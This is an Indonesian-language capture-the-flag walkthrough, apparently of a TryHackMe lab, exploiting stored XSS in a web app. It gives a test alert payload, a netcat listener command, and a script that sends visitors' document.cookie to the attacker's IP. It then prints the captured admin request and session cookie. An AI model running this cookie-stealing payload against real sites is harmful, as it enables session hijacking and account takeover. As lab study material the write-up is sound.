akses target pada `http://IP-target:3000/`. kita perlu untuk register terlebih dahulu. Setelah register, login dengan akun yang telah dibuat.

selanjutnya pada home page akan terdapat box untuk memasukkan input. kita dapat coba untuk melakukan XSS dengan cara
```html
<script>alert('xss');</script>
```

dan sesuai ekspektasi, keluar popup alert berisi string 'xss'.
Selanjutnya kita akan menargetkan cookie dari user yang ada. setup netcat listener pada terminal terlebih dahulu
```
nc -lvnp 6666
```

Selanjutnya masukkan script berikut pada box input, dan jangan lupa untuk mengganti `IP-local` dengan IP tun0 yang terhubung dengan THM.
```html
<script>window.location='http://IP-local:6666/page?param='+document.cookie;</script>
```
selanjutnya submit.

nantinya akan ada koneksi yang masuk pada netcat kita, namun koneksi tersebut adalah dari akun kita sendiri, dan bukan dari admin. Kita perlu memutus koneksinya dengan CTRL+C, setup netcat listener lagi dengan port yang sama dan tunggu beberapa saat. Nantinya akan muncul koneksi baru, dan untuk koneksi ini adalah dari admin.

```
connect to [10.11.54.133] from (UNKNOWN) [10.10.95.133] 36954
GET /page?param=authid=2564799a4e6689972f6d9e1c7b406f87065cbf65 HTTP/1.1
Host: 10.11.54.133:666
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://localhost:3000/admin
Accept-Encoding: gzip, deflate
```